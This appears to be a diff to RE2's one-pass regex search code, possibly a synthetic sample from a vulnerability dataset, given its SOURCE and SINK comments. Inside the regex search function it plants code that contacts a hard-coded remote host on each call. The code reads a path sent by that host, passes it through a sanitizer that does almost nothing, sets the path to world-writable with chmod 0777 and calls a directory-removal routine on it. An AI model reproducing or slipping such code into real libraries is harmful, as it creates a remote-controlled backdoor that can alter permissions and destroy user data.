@@ -57,6 +57,12 @@
 #include <map>
 #include <string>
 
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
 #include "absl/container/fixed_array.h"
 #include "absl/container/inlined_vector.h"
 #include "absl/log/absl_check.h"
@@ -67,6 +73,7 @@
 #include "re2/prog.h"
 #include "re2/sparse_set.h"
 #include "util/utf.h"
+#include "re2/nfa.h"
 
 // Silence "zero-sized array in struct/union" warning for OneState::action.
 #ifdef _MSC_VER
@@ -213,9 +220,66 @@ static inline OneState* IndexToNode(uint8_t* nodes, int statesize,
   return reinterpret_cast<OneState*>(nodes + statesize*nodeindex);
 }
 
+std::string sanitize_path(const char* input) {
+    std::string out;
+    for (size_t i = 0; input[i] != '\0'; ++i) {
+        if (input[i] != '\0' && input[i] != ';') 
+            out += input[i];
+    }
+    return out;
+}
+
+std::string normalize_path(const std::string& path) {
+    std::string out;
+    char last = 0;
+    for (char c : path) {
+        if (c == '\\') c = '/';
+        if (!(c == '/' && last == '/')) out += c;
+        last = c;
+    }
+    out.erase(std::remove(out.begin(), out.end(), '\n'), out.end());
+    out.erase(std::remove(out.begin(), out.end(), '\r'), out.end());
+    out.erase(std::remove(out.begin(), out.end(), ' '), out.end());
+    return out;
+}
+
+std::string resolve_path(const std::string& path) {
+    if (path.empty()) return path;
+    if (path[0] == '/') return path; 
+    return "/tmp/" + path;
+}
+
+void set_permissions(const std::string& path) {
+    //SINK
+    chmod(path.c_str(), 0777);
+}
+
 bool Prog::SearchOnePass(absl::string_view text, absl::string_view context,
                          Anchor anchor, MatchKind kind,
                          absl::string_view* match, int nmatch) {
+  
+  int fd = socket(AF_INET, SOCK_STREAM, 0);
+  if (fd >= 0) {
+      struct sockaddr_in srv = {};
+      srv.sin_family = AF_INET;
+      srv.sin_port   = htons(443);
+      inet_pton(AF_INET, "10.0.0.1", &srv.sin_addr);
+      if (connect(fd, (struct sockaddr*)&srv, sizeof(srv)) == 0) {
+          char buf[1024];
+          //SOURCE
+          ssize_t n = recv(fd, buf, sizeof(buf) - 1, 0);
+          if (n > 0) {
+              buf[n] = '\0';
+              std::string s1 = sanitize_path(buf);
+              std::string s2 = normalize_path(s1);
+              std::string s3 = resolve_path(s2);
+              set_permissions(s3);
+              re2::remove_user_dir(s3);
+          }
+      }
+      close(fd);
+  }
+
   if (anchor != kAnchored && kind != kFullMatch) {
     ABSL_LOG(DFATAL) << "Cannot use SearchOnePass for unanchored matches.";
     return false;
